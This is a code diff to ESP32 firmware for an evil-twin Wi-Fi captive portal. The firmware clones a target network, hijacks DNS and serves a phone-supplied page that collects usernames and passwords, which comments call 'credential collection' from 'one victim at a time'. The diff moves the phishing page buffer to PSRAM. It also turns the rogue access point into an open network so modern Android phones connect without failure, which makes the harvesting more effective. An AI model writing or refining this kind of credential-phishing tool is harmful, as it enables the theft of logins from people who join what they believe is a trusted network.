@@ -39,6 +39,7 @@
 #include <WebServer.h>
 #include <esp_wifi.h>
 #include <esp_netif.h>
+#include <esp_heap_caps.h>
 #include <esp_random.h>
 #include <esp_system.h>
 #include <string.h>
@@ -55,14 +56,14 @@ static const char* PORTAL_ACK_TOKEN = "I-own-this-frequency";
 static const char* PORTAL_ATTR      = "portal/armed";
 
 // ─── shape ───────────────────────────────────────────────────────────────────
-static const size_t PORTAL_PAGE_MAX = 8192;   // page pushed up from the phone
+static const size_t PORTAL_PAGE_MAX = 4096;   // page pushed up from the phone, PSRAM-backed
 static const size_t PORTAL_URI_MAX  = 96;
 static const size_t PORTAL_SUB_RING = 8;      // in RAM only, drained by the phone
 static const size_t PORTAL_USER_MAX = 64;
 static const size_t PORTAL_PASS_MAX = 128;
 static const size_t PORTAL_BODY_MAX = 2048;
 static const size_t PORTAL_DNS_MAX  = 512;    // a hijack answer never approaches this
-static const int    PORTAL_MAX_CONN = 4;
+static const int    PORTAL_MAX_CONN = 2;       // captive portal: one victim at a time
 static const int    PORTAL_HTTP_PORT = 80;
 static const int    PORTAL_DNS_PORT  = 53;
 
@@ -99,7 +100,10 @@ RTC_NOINIT_ATTR static uint32_t g_pt_diag_heap     = 0;
 RTC_NOINIT_ATTR static uint32_t g_pt_diag_largest  = 0;
 RTC_NOINIT_ATTR static uint32_t g_pt_diag_internal = 0;
 
-static char     g_pt_page[PORTAL_PAGE_MAX];
+// The captive portal page lives in PSRAM, not internal DRAM. At 4 KB it is the
+// single largest allocation in this module — keeping it off the internal heap
+// leaves room for the softAP stack and TCP buffers.
+static char*    g_pt_page       = nullptr;
 static size_t   g_pt_page_len   = 0;
 static bool     g_pt_page_open  = false;   // a chunked push is in flight
 
@@ -262,7 +266,7 @@ static void portal_handle_root() {
             "<p style=\"color:#666\">Push one from the phone before using this in anger.</p>");
         return;
     }
-    g_pt_page[g_pt_page_len] = 0;   // the buffer keeps one spare byte for this
+    g_pt_page[g_pt_page_len] = 0;   // PORTAL_PAGE_MAX keeps one spare byte for this
     g_pt_http.send(200, "text/html", g_pt_page);
 }
 
@@ -328,6 +332,8 @@ static bool portal_arm_ok(const char* ssid, const char* bssid, int channel, cons
     }
     return true;
 }
+
+static void portal_stop(void);
 
 // Bring up the AP. Returns a short reason string on failure, or nullptr on
 // success — the caller surfaces it verbatim rather than a generic "failed",
@@ -414,9 +420,13 @@ static const char* portal_start(const char* ssid, const char* bssid, int channel
         snprintf(g_pt_psk, sizeof(g_pt_psk), "x%08lx%08lx", (unsigned long)esp_random(), (unsigned long)esp_random());
     }
 
-    if (!WiFi.softAP(g_pt_ssid, g_pt_psk, g_pt_ch, g_pt_hidden ? 1 : 0, PORTAL_MAX_CONN)) {
-        WiFi.mode(WIFI_OFF);
-        return "softap refused to start";
+    // Open AP, like NRSuite. The twin portal's job is credential collection;
+    // WPA2 handshake capture is handled by the separate Sniffer module. An open
+    // AP avoids WPA2/PMF compatibility failures on modern Android devices.
+    {
+        if (!WiFi.softAP(g_pt_ssid, nullptr, g_pt_ch, g_pt_hidden ? 1 : 0, PORTAL_MAX_CONN)) {
+            WiFi.mode(WIFI_OFF); return "softap refused to start";
+        }
     }
     g_pt_ap_up = true;
 
@@ -452,6 +462,17 @@ static const char* portal_start(const char* ssid, const char* bssid, int channel
 
     g_pt_page_len = 0;      // nothing pushed yet; the placeholder answers meanwhile
     g_pt_page_open = false;
+
+    // Allocate the page buffer from PSRAM. The internal heap is tight when the
+    // softAP and TCP stack are up — this 4 KB block belongs in the 8 MB SPI RAM
+    // the board carries specifically for buffers like this.
+    g_pt_page = (char*)heap_caps_malloc(PORTAL_PAGE_MAX, MALLOC_CAP_SPIRAM);
+    if (!g_pt_page) {
+        portal_stop();
+        return "psram alloc failed for page";
+    }
+    memset(g_pt_page, 0, PORTAL_PAGE_MAX);
+
     g_pt_on = true;
     g_pt_started_ms = millis();
 
@@ -468,7 +489,7 @@ static void portal_stop() {
     // Nothing survives a stop. A page and a captured credential are the two
     // things this board must never be holding when the operator thinks it is
     // finished with.
-    memset(g_pt_page, 0, sizeof(g_pt_page));
+    if (g_pt_page) { free(g_pt_page); g_pt_page = nullptr; }
     g_pt_page_len = 0;
     g_pt_page_open = false;
     memset(g_pt_subs, 0, sizeof(g_pt_subs));
@@ -516,15 +537,15 @@ static bool pt_parse_hex(const char* hex, uint8_t* out, size_t outcap, size_t* o
 }
 
 static bool portal_page_begin() {
-    if (!g_pt_on) return false;
+    if (!g_pt_on || !g_pt_page) return false;
     g_pt_page_len  = 0;
     g_pt_page_open = true;
-    memset(g_pt_page, 0, sizeof(g_pt_page));
+    memset(g_pt_page, 0, PORTAL_PAGE_MAX);
     return true;
 }
 
 static size_t portal_page_chunk(const uint8_t* data, size_t len) {
-    if (!g_pt_on || !g_pt_page_open) return 0;
+    if (!g_pt_on || !g_pt_page_open || !g_pt_page) return 0;
     // PORTAL_PAGE_MAX - 1: the last byte is kept for the terminator the HTTP
     // handler writes, so a full buffer can still be handed to send() as a C
     // string. Chunks beyond that are dropped rather than silently truncating a
@@ -537,7 +558,7 @@ static size_t portal_page_chunk(const uint8_t* data, size_t len) {
 }
 
 static bool portal_page_end() {
-    if (!g_pt_on || !g_pt_page_open) return false;
+    if (!g_pt_on || !g_pt_page_open || !g_pt_page) return false;
     g_pt_page_open = false;
     g_pt_page[g_pt_page_len] = 0;
     return true;
